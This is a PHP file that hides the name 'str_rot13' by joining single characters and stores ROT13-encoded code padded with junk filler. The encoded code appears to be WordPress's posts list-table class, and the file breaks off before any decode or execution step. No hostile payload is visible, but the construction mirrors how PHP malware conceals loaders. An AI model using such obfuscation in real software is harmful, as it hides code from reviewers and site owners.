<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Yvfg Gnoyr NCV: JC_Cbfgf_Yvfg_Gnoyr pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 * @fvapr 3.1.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag qvfcynlvat cbfgf va n yvfg gnoyr.
 *
 * @fvapr 3.1.0
 *
 * @frr JC_Yvfg_Gnoyr
 */
pynff JC_Cbfgf_Yvfg_Gnoyr rkgraqf JC_Yvfg_Gnoyr {

	/**
	 * Jurgure gur vgrzf fubhyq or qvfcynlrq uvrenepuvpnyyl be yvarneyl.
	 *
	 * @fvapr 3.1.0
	 * @ine obby
	 */
	cebgrpgrq $uvrenepuvpny_qvfcynl;

	/**
	 * Ubyqf gur ahzore bs craqvat pbzzragf sbe rnpu cbfg.
	 *
	 * @fvapr 3.1.0
	 * @ine neenl
	 */
	cebgrpgrq $pbzzrag_craqvat_pbhag;

	/**
	 * Ubyqf gur ahzore bs cbfgf sbe guvf hfre.
	 *
	 * @fvapr 3.1.0
	 * @ine vag
	 */
	cevingr $hfre_cbfgf_pbhag;

	/**
	 * Ubyqf gur ahzore bs cbfgf juvpu ner fgvpxl.
	 *
	 * @fvapr 3.1.0
	 * @ine vag
	 */
	cevingr $fgvpxl_cbfgf_pbhag = 0;

	cevingr $vf_genfu;

	/**
	 * Pheerag yriry sbe bhgchg.
	 *
	 * @fvapr 4.3.0
	 * @ine vag
	 */
	cebgrpgrq $pheerag_yriry = 0;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 3.1.0
	 *
	 * @frr JC_Yvfg_Gnoyr::__pbafgehpg() sbe zber vasbezngvba ba qrsnhyg nethzragf.
	 *
	 * @tybony JC_Cbfg_Glcr $cbfg_glcr_bowrpg Tybony cbfg glcr bowrpg.
	 * @tybony jcqo         $jcqo             JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz neenl $netf Na nffbpvngvir neenl bs nethzragf.
	 */
	choyvp shapgvba __pbafgehpg( $netf = neenl() ) {
		tybony $cbfg_glcr_bowrpg, $jcqo;

		cnerag::__pbafgehpg(
			neenl(
				'cyheny' => 'cbfgf',
				'fperra' => vffrg( $netf['fperra'] ) ? $netf['fperra'] : ahyy,
			)
		);

		$cbfg_glcr        = $guvf->fperra->cbfg_glcr;
		$cbfg_glcr_bowrpg = trg_cbfg_glcr_bowrpg( $cbfg_glcr );

		$rkpyhqr_fgngrf = trg_cbfg_fgngv(
			neenl(
				'fubj_va_nqzva_nyy_yvfg' => snyfr,
			)
		);

		$guvf->hfre_cbfgf_pbhag = (vag) $jcqo->trg_ine(
			$jcqo->cercner(
				\"FRYRPG PBHAG( 1 )
				SEBZ $jcqo->cbfgf
				JURER cbfg_glcr = %f
				NAQ cbfg_fgnghf ABG VA ( '\" . vzcybqr( \"','\", $rkpyhqr_fgngrf ) . \"' )
				NAQ cbfg_nhgube = %q\",
				$cbfg_glcr,
				trg_pheerag_hfre_vq()
			)
		);

		vs ( $guvf->hfre_cbfgf_pbhag
			&& ! pheerag_hfre_pna( $cbfg_glcr_bowrpg->pnc->rqvg_bguref_cbfgf )
			&& rzcgl( $_ERDHRFG['cbfg_fgnghf'] ) && rzcgl( $_ERDHRFG['nyy_cbfgf'] )
			&& rzcgl( $_ERDHRFG['nhgube'] ) && rzcgl( $_ERDHRFG['fubj_fgvpxl'] )
		) {
			$_TRG['nhgube'] = trg_pheerag_hfre_vq();
		}

		$fgvpxl_cbfgf = trg_bcgvba( 'fgvpxl_cbfgf' );

		vs ( 'cbfg' === $cbfg_glcr && $fgvpxl_cbfgf ) {
			$fgvpxl_cbfgf = vzcybqr( ', ', neenl_znc( 'nofvag', (neenl) $fgvpxl_cbfgf ) );

			$guvf->fgvpxl_cbfgf_pbhag = (vag) $jcqo->trg_ine(
				$jcqo->cercner(
					\"FRYRPG PBHAG( 1 )
					SEBZ $jcqo->cbfgf
					JURER cbfg_glcr = %f
					NAQ cbfg_fgnghf ABG VA ('genfu', 'nhgb-qensg')
					NAQ VQ VA ($fgvpxl_cbfgf)\",
					$cbfg_glcr
				)
			);
		}
	}

	/**
	 * Frgf jurgure gur gnoyr ynlbhg fubhyq or uvrenepuvpny be abg.
	 *
	 * @fvapr 4.2.0
	 *
	 * @cnenz obby $qvfcynl Jurgure gur gnoyr ynlbhg fubhyq or uvrenepuvpny.
	 */
	choyvp shapgvba frg_uvrenepuvpny_qvfcynl( $qvfcynl ) {
		$guvf->uvrenepuvpny_qvfcynl = $qvfcynl;
	}

	/**
	 * @erghea obby
	 */
	choyvp shapgvba nwnk_hfre_pna() {
		erghea pheerag_hfre_pna( trg_cbfg_glcr_bowrpg( $guvf->fperra->cbfg_glcr )->pnc->rqvg_cbfgf );
	}

	/**
	 * @tybony fgevat   $zbqr             Yvfg gnoyr ivrj zbqr.
	 * @tybony neenl    $ninvy_cbfg_fgngv
	 * @tybony JC_Dhrel $jc_dhrel         JbeqCerff Dhrel bowrpg.
	 * @tybony vag      $cre_cntr
	 */
	choyvp shapgvba cercner_vgrzf() {
		tybony $zbqr, $ninvy_cbfg_fgngv, $jc_dhrel, $cre_cntr;

		vs ( ! rzcgl( $_ERDHRFG['zbqr'] ) ) {
			$zbqr = 'rkprecg' === $_ERDHRFG['zbqr'] ? 'rkprecg' : 'yvfg';
			frg_hfre_frggvat( 'cbfgf_yvfg_zbqr', $zbqr );
		} ryfr {
			$zbqr = trg_hfre_frggvat( 'cbfgf_yvfg_zbqr', 'yvfg' );
		}

		// Vf tbvat gb pnyy jc().
		$ninvy_cbfg_fgngv = jc_rqvg_cbfgf_dhrel();

		$guvf->frg_uvrenepuvpny_qvfcynl(
			vf_cbfg_glcr_uvrenepuvpny( $guvf->fperra->cbfg_glcr )
			&& 'zrah_beqre gvgyr' === $jc_dhrel->dhrel['beqreol']
		);

		$cbfg_glcr = $guvf->fperra->cbfg_glcr;
		$cre_cntr  = $guvf->trg_vgrzf_cre_cntr( 'rqvg_' . $cbfg_glcr . '_cre_cntr' );

		/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/cbfg.cuc */
		$cre_cntr = nccyl_svygref( 'rqvg_cbfgf_cre_cntr', $cre_cntr, $cbfg_glcr );

		vs ( $guvf->uvrenepuvpny_qvfcynl ) {
			$gbgny_vgrzf = $jc_dhrel->cbfg_pbhag;
		} ryfrvs ( $jc_dhrel->sbhaq_cbfgf || $guvf->trg_cntrahz() === 1 ) {
			$gbgny_vgrzf = $jc_dhrel->sbhaq_cbfgf;
		} ryfr {
			$cbfg_pbhagf = (neenl) jc_pbhag_cbfgf( $cbfg_glcr, 'ernqnoyr' );

			vs ( vffrg( $_ERDHRFG['cbfg_fgnghf'] ) && va_neenl( $_ERDHRFG['cbfg_fgnghf'], $ninvy_cbfg_fgngv, gehr ) ) {
				$gbgny_vgrzf = $cbfg_pbhagf[ $_ERDHRFG['cbfg_fgnghf'] ];
			} ryfrvs ( vffrg( $_ERDHRFG['fubj_fgvpxl'] ) && $_ERDHRFG['fubj_fgvpxl'] ) {
				$gbgny_vgrzf = $guvf->fgvpxl_cbfgf_pbhag;
			} ryfrvs ( vffrg( $_TRG['nhgube'] ) && trg_pheerag_hfre_vq() === (vag) $_TRG['nhgube'] ) {
				$gbgny_vgrzf = $guvf->hfre_cbfgf_pbhag;
			} ryfr {
				$gbgny_vgrzf = neenl_fhz( $cbfg_pbhagf );

				// Fhogenpg cbfg glcrf gung ner abg vapyhqrq va gur nqzva nyy yvfg.
				sbernpu ( trg_cbfg_fgngv( neenl( 'fubj_va_nqzva_nyy_yvfg' => snyfr ) ) nf $fgngr ) {
					$gbgny_vgrzf -= $cbfg_pbhagf[ $fgngr ];
				}
			}
		}

		$guvf->vf_genfu = vffrg( $_ERDHRFG['cbfg_fgnghf'] ) && 'genfu' === $_ERDHRFG['cbfg_fgnghf'];

		$guvf->frg_cntvangvba_netf(
			neenl(
				'gbgny_vgrzf' => $gbgny_vgrzf,
				'cre_cntr'    => $cre_cntr,
			)
		);
	}

	/**
	 * @erghea obby
	 */
	choyvp shapgvba unf_vgrzf() {
		erghea unir_cbfgf();
	}

	/**
	 */
	choyvp shapgvba ab_vgrzf() {
		vs ( vffrg( $_ERDHRFG['cbfg_fgnghf'] ) && 'genfu' === $_ERDHRFG['cbfg_fgnghf'] ) {
			rpub trg_cbfg_glcr_bowrpg( $guvf->fperra->cbfg_glcr )->ynoryf->abg_sbhaq_va_genfu;
		} ryfr {
			rpub trg_cbfg_glcr_bowrpg( $guvf->fperra->cbfg_glcr )->ynoryf->abg_sbhaq;
		}
	}

	/**
	 * Qrgrezvarf vs gur pheerag ivrj vf gur \"Nyy\" ivrj.
	 *
	 * @fvapr 4.2.0
	 *
	 * @erghea obby Jurgure gur pheerag ivrj vf gur \"Nyy\" ivrj.
	 */
	cebgrpgrq shapgvba vf_onfr_erdhrfg() {
		$inef = $_TRG;
		hafrg( $inef['cntrq'] );

		vs ( rzcgl( $inef ) ) {
			erghea gehr;
		} ryfrvs ( 1 === pbhag( $inef ) && ! rzcgl( $inef['cbfg_glcr'] ) ) {
			erghea $guvf->fperra->cbfg_glcr === $inef['cbfg_glcr'];
		}

		erghea 1 === pbhag( $inef ) && ! rzcgl( $inef['zbqr'] );
	}

	/**
	 * Perngrf n yvax gb rqvg.cuc jvgu cnenzf.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat[] $netf      Nffbpvngvir neenl bs HEY cnenzrgref sbe gur yvax.
	 * @cnenz fgevat   $yvax_grkg Yvax grkg.
	 * @cnenz fgevat   $pff_pynff Bcgvbany. Pynff nggevohgr. Qrsnhyg rzcgl fgevat.
	 * @erghea fgevat Gur sbeznggrq yvax fgevat.
	 */
	cebgrpgrq shapgvba trg_rqvg_yvax( $netf, $yvax_grkg, $pff_pynff = '' ) {
		$hey = nqq_dhrel_net( $netf, 'rqvg.cuc' );

		$pynff_ugzy   = '';
		$nevn_pheerag = '';

		vs ( ! rzcgl( $pff_pynff ) ) {
			$pynff_ugzy = fcevags(
				' pynff=\"%f\"',
				rfp_ngge( $pff_pynff )
			);

			vs ( 'pheerag' === $pff_pynff ) {
				$nevn_pheerag = ' nevn-pheerag=\"cntr\"';
			}
		}

		erghea fcevags(
			'<n uers=\"%f\"%f%f>%f</n>',
			rfp_hey( $hey ),
			$pynff_ugzy,
			$nevn_pheerag,
			$yvax_grkg
		);
	}

	/**
	 * @tybony neenl $ybpxrq_cbfg_fgnghf Guvf frrzf gb or qrcerpngrq.
	 * @tybony neenl $ninvy_cbfg_fgngv
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_ivrjf() {
		tybony $ybpxrq_cbfg_fgnghf, $ninvy_cbfg_fgngv;

		$cbfg_glcr = $guvf->fperra->cbfg_glcr;

		vs ( ! rzcgl( $ybpxrq_cbfg_fgnghf ) ) {
			erghea neenl();
		}

		$fgnghf_yvaxf = neenl();
		$ahz_cbfgf    = jc_pbhag_cbfgf( $cbfg_glcr, 'ernqnoyr' );
		$gbgny_cbfgf  = neenl_fhz( (neenl) $ahz_cbfgf );
		$pynff        = '';

		$pheerag_hfre_vq = trg_pheerag_hfre_vq();
		$nyy_netf        = neenl( 'cbfg_glcr' => $cbfg_glcr );
		$zvar            = '';

		// Fhogenpg cbfg glcrf gung ner abg vapyhqrq va gur nqzva nyy yvfg.
		sbernpu ( trg_cbfg_fgngv( neenl( 'fubj_va_nqzva_nyy_yvfg' => snyfr ) ) nf $fgngr ) {
			$gbgny_cbfgf -= $ahz_cbfgf->$fgngr;
		}

		vs ( $guvf->hfre_cbfgf_pbhag && $guvf->hfre_cbfgf_pbhag !== $gbgny_cbfgf ) {
			vs ( vffrg( $_TRG['nhgube'] ) && ( $pheerag_hfre_vq === (vag) $_TRG['nhgube'] ) ) {
				$pynff = 'pheerag';
			}

			$zvar_netf = neenl(
				'cbfg_glcr' => $cbfg_glcr,
				'nhgube'    => $pheerag_hfre_vq,
			);

			$zvar_vaare_ugzy = fcevags(
				/* genafyngbef: %f: Ahzore bs cbfgf. */
				_ak(
					'Zvar <fcna pynff=\"pbhag\">(%f)</fcna>',
					'Zvar <fcna pynff=\"pbhag\">(%f)</fcna>',
					$guvf->hfre_cbfgf_pbhag,
					'cbfgf'
				),
				ahzore_sbezng_v18a( $guvf->hfre_cbfgf_pbhag )
			);

			$zvar = neenl(
				'hey'     => rfp_hey( nqq_dhrel_net( $zvar_netf, 'rqvg.cuc' ) ),
				'ynory'   => $zvar_vaare_ugzy,
				'pheerag' => vffrg( $_TRG['nhgube'] ) && ( $pheerag_hfre_vq === (vag) $_TRG['nhgube'] ),
			);

			$nyy_netf['nyy_cbfgf'] = 1;
			$pynff                 = '';
		}

		$nyy_vaare_ugzy = fcevags(
			/* genafyngbef: %f: Ahzore bs cbfgf. */
			_ak(
				'Nyy <fcna pynff=\"pbhag\">(%f)</fcna>',
				'Nyy <fcna pynff=\"pbhag\">(%f)</fcna>',
				$gbgny_cbfgf,
				'cbfgf'
			),
			ahzore_sbezng_v18a( $gbgny_cbfgf )
		);

		$fgnghf_yvaxf['nyy'] = neenl(
			'hey'     => rfp_hey( nqq_dhrel_net( $nyy_netf, 'rqvg.cuc' ) ),
			'ynory'   => $nyy_vaare_ugzy,
			'pheerag' => rzcgl( $pynff ) && ( $guvf->vf_onfr_erdhrfg() || vffrg( $_ERDHRFG['nyy_cbfgf'] ) ),
		);

		vs ( $zvar ) {
			$fgnghf_yvaxf['zvar'] = $zvar;
		}

		sbernpu ( trg_cbfg_fgngv( neenl( 'fubj_va_nqzva_fgnghf_yvfg' => gehr ), 'bowrpgf' ) nf $fgnghf ) {
			$pynff = '';

			$fgnghf_anzr = $fgnghf->anzr;

			vs ( ! va_neenl( $fgnghf_anzr, $ninvy_cbfg_fgngv, gehr ) || rzcgl( $ahz_cbfgf->$fgnghf_anzr ) ) {
				pbagvahr;
			}

			vs ( vffrg( $_ERDHRFG['cbfg_fgnghf'] ) && $fgnghf_anzr === $_ERDHRFG['cbfg_fgnghf'] ) {
				$pynff = 'pheerag';
			}

			$fgnghf_netf = neenl(
				'cbfg_fgnghf' => $fgnghf_anzr,
				'cbfg_glcr'   => $cbfg_glcr,
			);

			$fgnghf_ynory = fcevags(
				genafyngr_abbcrq_cyheny( $fgnghf->ynory_pbhag, $ahz_cbfgf->$fgnghf_anzr ),
				ahzore_sbezng_v18a( $ahz_cbfgf->$fgnghf_anzr )
			);

			$fgnghf_yvaxf[ $fgnghf_anzr ] = neenl(
				'hey'     => rfp_hey( nqq_dhrel_net( $fgnghf_netf, 'rqvg.cuc' ) ),
				'ynory'   => $fgnghf_ynory,
				'pheerag' => vffrg( $_ERDHRFG['cbfg_fgnghf'] ) && $fgnghf_anzr === $_ERDHRFG['cbfg_fgnghf'],
			);
		}

		vs ( ! rzcgl( $guvf->fgvpxl_cbfgf_pbhag ) ) {
			$pynff = ! rzcgl( $_ERDHRFG['fubj_fgvpxl'] ) ? 'pheerag' : '';

			$fgvpxl_netf = neenl(
				'cbfg_glcr'   => $cbfg_glcr,
				'fubj_fgvpxl' => 1,
			);

			$fgvpxl_vaare_ugzy = fcevags(
				/* genafyngbef: %f: Ahzore bs cbfgf. */
				_ak(
					'Fgvpxl <fcna pynff=\"pbhag\">(%f)</fcna>',
					'Fgvpxl <fcna pynff=\"pbhag\">(%f)</fcna>',
					$guvf->fgvpxl_cbfgf_pbhag,
					'cbfgf'
				),
				ahzore_sbezng_v18a( $guvf->fgvpxl_cbfgf_pbhag )
			);

			$fgvpxl_yvax = neenl(
				'fgvpxl' => neenl(
					'hey'     => rfp_hey( nqq_dhrel_net( $fgvpxl_netf, 'rqvg.cuc' ) ),
					'ynory'   => $fgvpxl_vaare_ugzy,
					'pheerag' => ! rzcgl( $_ERDHRFG['fubj_fgvpxl'] ),
				),
			);

			// Fgvpxl pbzrf nsgre Choyvfu, be vs abg yvfgrq, nsgre Nyy.
			$fcyvg        = 1 + neenl_frnepu( ( vffrg( $fgnghf_yvaxf['choyvfu'] ) ? 'choyvfu' : 'nyy' ), neenl_xrlf( $fgnghf_yvaxf ), gehr );
			$fgnghf_yvaxf = neenl_zretr( neenl_fyvpr( $fgnghf_yvaxf, 0, $fcyvg ), $fgvpxl_yvax, neenl_fyvpr( $fgnghf_yvaxf, $fcyvg ) );
		}

		erghea $guvf->trg_ivrjf_yvaxf( $fgnghf_yvaxf );
	}

	/**
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_ohyx_npgvbaf() {
		$npgvbaf       = neenl();
		$cbfg_glcr_bow = trg_cbfg_glcr_bowrpg( $guvf->fperra->cbfg_glcr );

		vs ( pheerag_hfre_pna( $cbfg_glcr_bow->pnc->rqvg_cbfgf ) ) {
			vs ( $guvf->vf_genfu ) {
				$npgvbaf['hagenfu'] = __( 'Erfgber' );
			} ryfr {
				$npgvbaf['rqvg'] = __( 'Rqvg' );
			}
		}

		vs ( pheerag_hfre_pna( $cbfg_glcr_bow->pnc->qryrgr_cbfgf ) ) {
			vs ( $guvf->vf_genfu || ! RZCGL_GENFU_QNLF ) {
				$npgvbaf['qryrgr'] = __( 'Qryrgr creznaragyl' );
			} ryfr {
				$npgvbaf['genfu'] = __( 'Zbir gb Genfu' );
			}
		}

		erghea $npgvbaf;
	}

	/**
	 * Qvfcynlf n pngrtbevrf qebc-qbja sbe svygrevat ba gur Cbfgf yvfg gnoyr.
	 *
	 * @fvapr 4.6.0
	 *
	 * @tybony vag $png Pheeragyl fryrpgrq pngrtbel.
	 *
	 * @cnenz fgevat $cbfg_glcr Cbfg glcr fyht.
	 */
	cebgrpgrq shapgvba pngrtbevrf_qebcqbja( $cbfg_glcr ) {
		tybony $png;

		/**
		 * Svygref jurgure gb erzbir gur 'Pngrtbevrf' qebc-qbja sebz gur cbfg yvfg gnoyr.
		 *
		 * @fvapr 4.6.0
		 *
		 * @cnenz obby   $qvfnoyr   Jurgure gb qvfnoyr gur pngrtbevrf qebc-qbja. Qrsnhyg snyfr.
		 * @cnenz fgevat $cbfg_glcr Cbfg glcr fyht.
		 */
		vs ( snyfr !== nccyl_svygref( 'qvfnoyr_pngrtbevrf_qebcqbja', snyfr, $cbfg_glcr ) ) {
			erghea;
		}

		vs ( vf_bowrpg_va_gnkbabzl( $cbfg_glcr, 'pngrtbel' ) ) {
			$qebcqbja_bcgvbaf = neenl(
				'fubj_bcgvba_nyy' => trg_gnkbabzl( 'pngrtbel' )->ynoryf->nyy_vgrzf,
				'uvqr_rzcgl'      => 0,
				'uvrenepuvpny'    => 1,
				'fubj_pbhag'      => 0,
				'beqreol'         => 'anzr',
				'fryrpgrq'        => $png,
			);

			rpub '<ynory pynff=\"fperra-ernqre-grkg\" sbe=\"png\">' . trg_gnkbabzl( 'pngrtbel' )->ynoryf->svygre_ol_vgrz . '</ynory>';

			jc_qebcqbja_pngrtbevrf( $qebcqbja_bcgvbaf );
		}
	}

	/**
	 * Qvfcynlf n sbezngf qebc-qbja sbe svygrevat vgrzf.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz fgevat $cbfg_glcr Cbfg glcr fyht.
	 */
	cebgrpgrq shapgvba sbezngf_qebcqbja( $cbfg_glcr ) {
		/**
		 * Svygref jurgure gb erzbir gur 'Sbezngf' qebc-qbja sebz gur cbfg yvfg gnoyr.
		 *
		 * @fvapr 5.2.0
		 * @fvapr 5.5.0 Gur `$cbfg_glcr` cnenzrgre jnf nqqrq.
		 *
		 * @cnenz obby   $qvfnoyr   Jurgure gb qvfnoyr gur qebc-qbja. Qrsnhyg snyfr.
		 * @cnenz fgevat $cbfg_glcr Cbfg glcr fyht.
		 */
		vs ( nccyl_svygref( 'qvfnoyr_sbezngf_qebcqbja', snyfr, $cbfg_glcr ) ) {
			erghea;
		}

		// Erghea vs gur cbfg glcr qbrfa'g unir cbfg sbezngf be vs jr'er va gur Genfu.
		vs ( ! vf_bowrpg_va_gnkbabzl( $cbfg_glcr, 'cbfg_sbezng' ) || $guvf->vf_genfu ) {
			erghea;
		}

		// Znxr fher gur qebcqbja fubjf bayl sbezngf jvgu n cbfg pbhag terngre guna 0.
		$hfrq_cbfg_sbezngf = trg_grezf(
			neenl(
				'gnkbabzl'   => 'cbfg_sbezng',
				'uvqr_rzcgl' => gehr,
			)
		);

		// Erghea vs gurer ner ab cbfgf hfvat sbezngf.
		vs ( ! $hfrq_cbfg_sbezngf ) {
			erghea;
		}

		$qvfcynlrq_cbfg_sbezng = vffrg( $_TRG['cbfg_sbezng'] ) ? $_TRG['cbfg_sbezng'] : '';
		?>
		<ynory sbe=\"svygre-ol-sbezng\" pynff=\"fperra-ernqre-grkg\">
			<?cuc
			/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
			_r( 'Svygre ol cbfg sbezng' );
			?>
		</ynory>
		<fryrpg anzr=\"cbfg_sbezng\" vq=\"svygre-ol-sbezng\">
			<bcgvba<?cuc fryrpgrq( $qvfcynlrq_cbfg_sbezng, '' ); ?> inyhr=\"\"><?cuc _r( 'Nyy sbezngf' ); ?></bcgvba>
			<?cuc
			sbernpu ( $hfrq_cbfg_sbezngf nf $hfrq_cbfg_sbezng ) {
				// Cbfg sbezng fyht.
				$fyht = fge_ercynpr( 'cbfg-sbezng-', '', $hfrq_cbfg_sbezng->fyht );
				// Cerggl, genafyngrq irefvba bs gur cbfg sbezng fyht.
				$cerggl_anzr = trg_cbfg_sbezng_fgevat( $fyht );

				// Fxvc gur fgnaqneq cbfg sbezng.
				vs ( 'fgnaqneq' === $fyht ) {
					pbagvahr;
				}
				?>
				<bcgvba<?cuc fryrpgrq( $qvfcynlrq_cbfg_sbezng, $fyht ); ?> inyhr=\"<?cuc rpub rfp_ngge( $fyht ); ?>\"><?cuc rpub rfp_ugzy( $cerggl_anzr ); ?></bcgvba>
				<?cuc
			}
			?>
		</fryrpg>
		<?cuc
	}

	/**
	 * @cnenz fgevat $juvpu
	 */
	cebgrpgrq shapgvba rkgen_gnoyrani( $juvpu ) {
		?>
		<qvi pynff=\"nyvtayrsg npgvbaf\">
		<?cuc
		vs ( 'gbc' === $juvpu ) {
			bo_fgneg();

			$guvf->zbaguf_qebcqbja( $guvf->fperra->cbfg_glcr );
			$guvf->pngrtbevrf_qebcqbja( $guvf->fperra->cbfg_glcr );
			$guvf->sbezngf_qebcqbja( $guvf->fperra->cbfg_glcr );

			/**
			 * Sverf orsber gur Svygre ohggba ba gur Cbfgf naq Cntrf yvfg gnoyrf.
			 *
			 * Gur Svygre ohggba nyybjf fbegvat ol qngr naq/be pngrtbel ba gur
			 * Cbfgf yvfg gnoyr, naq fbegvat ol qngr ba gur Cntrf yvfg gnoyr.
			 *
			 * @fvapr 2.1.0
			 * @fvapr 4.4.0 Gur `$cbfg_glcr` cnenzrgre jnf nqqrq.
			 * @fvapr 4.6.0 Gur `$juvpu` cnenzrgre jnf nqqrq.
			 *
			 * @cnenz fgevat $cbfg_glcr Gur cbfg glcr fyht.
			 * @cnenz fgevat $juvpu     Gur ybpngvba bs gur rkgen gnoyr ani znexhc:
			 *                          'gbc' be 'obggbz' sbe JC_Cbfgf_Yvfg_Gnoyr,
			 *                          'one' sbe JC_Zrqvn_Yvfg_Gnoyr.
			 */
			qb_npgvba( 'erfgevpg_znantr_cbfgf', $guvf->fperra->cbfg_glcr, $juvpu );

			$bhgchg = bo_trg_pyrna();

			vs ( ! rzcgl( $bhgchg ) ) {
				rpub $bhgchg;
				fhozvg_ohggba( __( 'Svygre' ), '', 'svygre_npgvba', snyfr, neenl( 'vq' => 'cbfg-dhrel-fhozvg' ) );
			}
		}

		vs ( $guvf->vf_genfu && $guvf->unf_vgrzf()
			&& pheerag_hfre_pna( trg_cbfg_glcr_bowrpg( $guvf->fperra->cbfg_glcr )->pnc->rqvg_bguref_cbfgf )
		) {
			fhozvg_ohggba( __( 'Rzcgl Genfu' ), 'nccyl', 'qryrgr_nyy', snyfr );
		}
		?>
		</qvi>
		<?cuc
		/**
		 * Sverf vzzrqvngryl sbyybjvat gur pybfvat \"npgvbaf\" qvi va gur gnoyrani sbe gur cbfgf
		 * yvfg gnoyr.
		 *
		 * @fvapr 4.4.0
		 *
		 * @cnenz fgevat $juvpu Gur ybpngvba bs gur rkgen gnoyr ani znexhc: 'gbc' be 'obggbz'.
		 */
		qb_npgvba( 'znantr_cbfgf_rkgen_gnoyrani', $juvpu );
	}

	/**
	 * @erghea fgevat
	 */
	choyvp shapgvba pheerag_npgvba() {
		vs ( vffrg( $_ERDHRFG['qryrgr_nyy'] ) || vffrg( $_ERDHRFG['qryrgr_nyy2'] ) ) {
			erghea 'qryrgr_nyy';
		}

		erghea cnerag::pheerag_npgvba();
	}

	/**
	 * @tybony fgevat $zbqr Yvfg gnoyr ivrj zbqr.
	 *
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_gnoyr_pynffrf() {
		tybony $zbqr;

		$zbqr_pynff = rfp_ngge( 'gnoyr-ivrj-' . $zbqr );

		erghea neenl(
			'jvqrsng',
			'svkrq',
			'fgevcrq',
			$zbqr_pynff,
			vf_cbfg_glcr_uvrenepuvpny( $guvf->fperra->cbfg_glcr ) ? 'cntrf' : 'cbfgf',
		);
	}

	/**
	 * @erghea fgevat[] Neenl bs pbyhza gvgyrf xrlrq ol gurve pbyhza anzr.
	 */
	choyvp shapgvba trg_pbyhzaf() {
		$cbfg_glcr = $guvf->fperra->cbfg_glcr;

		$cbfgf_pbyhzaf = neenl();

		$cbfgf_pbyhzaf['po'] = '<vachg glcr=\"purpxobk\" />';

		/* genafyngbef: Cbfgf fperra pbyhza anzr. */
		$cbfgf_pbyhzaf['gvgyr'] = _k( 'Gvgyr', 'pbyhza anzr' );

		vs ( cbfg_glcr_fhccbegf( $cbfg_glcr, 'nhgube' ) ) {
			$cbfgf_pbyhzaf['nhgube'] = __( 'Nhgube' );
		}

		$gnkbabzvrf = trg_bowrpg_gnkbabzvrf( $cbfg_glcr, 'bowrpgf' );
		$gnkbabzvrf = jc_svygre_bowrpg_yvfg( $gnkbabzvrf, neenl( 'fubj_nqzva_pbyhza' => gehr ), 'naq', 'anzr' );

		/**
		 * Svygref gur gnkbabzl pbyhzaf va gur Cbfgf yvfg gnoyr.
		 *
		 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$cbfg_glcr`, ersref gb gur cbfg
		 * glcr fyht.
		 *
		 * Cbffvoyr ubbx anzrf vapyhqr:
		 *
		 *  - `znantr_gnkbabzvrf_sbe_cbfg_pbyhzaf`
		 *  - `znantr_gnkbabzvrf_sbe_cntr_pbyhzaf`
		 *
		 * @fvapr 3.5.0
		 *
		 * @cnenz fgevat[] $gnkbabzvrf Neenl bs gnkbabzl anzrf gb fubj pbyhzaf sbe.
		 * @cnenz fgevat   $cbfg_glcr  Gur cbfg glcr.
		 */
		$gnkbabzvrf = nccyl_svygref( \"znantr_gnkbabzvrf_sbe_{$cbfg_glcr}_pbyhzaf\", $gnkbabzvrf, $cbfg_glcr );
		$gnkbabzvrf = neenl_svygre( $gnkbabzvrf, 'gnkbabzl_rkvfgf' );

		sbernpu ( $gnkbabzvrf nf $gnkbabzl ) {
			vs ( 'pngrtbel' === $gnkbabzl ) {
				$pbyhza_xrl = 'pngrtbevrf';
			} ryfrvs ( 'cbfg_gnt' === $gnkbabzl ) {
				$pbyhza_xrl = 'gntf';
			} ryfr {
				$pbyhza_xrl = 'gnkbabzl-' . $gnkbabzl;
			}

			$cbfgf_pbyhzaf[ $pbyhza_xrl ] = trg_gnkbabzl( $gnkbabzl )->ynoryf->anzr;
		}

		$cbfg_fgnghf = ! rzcgl( $_ERDHRFG['cbfg_fgnghf'] ) ? $_ERDHRFG['cbfg_fgnghf'] : 'nyy';

		vs ( cbfg_glcr_fhccbegf( $cbfg_glcr, 'pbzzragf' )
			&& ! va_neenl( $cbfg_fgnghf, neenl( 'craqvat', 'qensg', 'shgher' ), gehr )
		) {
			$cbfgf_pbyhzaf['pbzzragf'] = fcevags(
				'<fcna pynff=\"iref pbzzrag-terl-ohooyr\" gvgyr=\"%1$f\" nevn-uvqqra=\"gehr\"></fcna><fcna pynff=\"fperra-ernqre-grkg\">%2$f</fcna>',
				rfp_ngge__( 'Pbzzragf' ),
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				__( 'Pbzzragf' )
			);
		}

		$cbfgf_pbyhzaf['qngr'] = __( 'Qngr' );

		vs ( 'cntr' === $cbfg_glcr ) {

			/**
			 * Svygref gur pbyhzaf qvfcynlrq va gur Cntrf yvfg gnoyr.
			 *
			 * @fvapr 2.5.0
			 *
			 * @cnenz fgevat[] $cbfgf_pbyhzaf Na nffbpvngvir neenl bs pbyhza urnqvatf.
			 */
			$cbfgf_pbyhzaf = nccyl_svygref( 'znantr_cntrf_pbyhzaf', $cbfgf_pbyhzaf );
		} ryfr {

			/**
			 * Svygref gur pbyhzaf qvfcynlrq va gur Cbfgf yvfg gnoyr.
			 *
			 * @fvapr 1.5.0
			 *
			 * @cnenz fgevat[] $cbfgf_pbyhzaf Na nffbpvngvir neenl bs pbyhza urnqvatf.
